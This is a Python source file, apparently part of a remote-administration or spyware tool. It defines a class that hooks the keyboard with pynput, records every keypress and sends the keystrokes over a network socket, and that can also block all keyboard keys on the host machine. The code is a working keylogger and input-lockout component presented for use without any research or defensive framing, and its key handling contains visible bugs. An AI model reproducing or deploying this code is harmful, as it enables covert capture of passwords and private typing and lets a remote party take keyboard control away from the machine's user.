import keyboard as kb
from pynput import keyboard

class KeyControl:
    def __init__(self, sock, request):
        self.sock = sock
        self.request = request
        self.key_list = []

    def on_press(self, key):
        try:
            self.key_list.append(str.format(key.char + '\n'))
        except AttributeError:
            if key == keyboard.Key.esc:
                pass
            else:
                self.key_list.append(str.format(key.char) + '\n')
        else:
            message = ''.join(self.key_list)
            self.sock.sendall(message.encode('utf-8'))

    def on_release(self, key):
        if key == keyboard.Key.esc:
            return False

    def lock_key(self):
        # locks all keys of keyboard
        for i in range(150):
            kb.block_key(i)

    def unlock_key(self):
        # unlocks all keys of keyboard
        for i in range(150):
            kb.unblock_key(i)

    def do_task(self):
        listener = keyboard.Listener(
            on_press=self.on_press,
            on_release=self.on_release)

        if self.request == 'hook_key':
            listener.start()

        elif self.request == 'unhook_key':
            stop = keyboard.Controller()
            stop.release(keyboard.Key.esc)

            self.sock.sendall('\r\n'.encode('utf-8'))

        elif (self.request == 'lock_key'):
            self.lock_key()
        elif (self.request == 'unlock_key'):
            self.unlock_key()
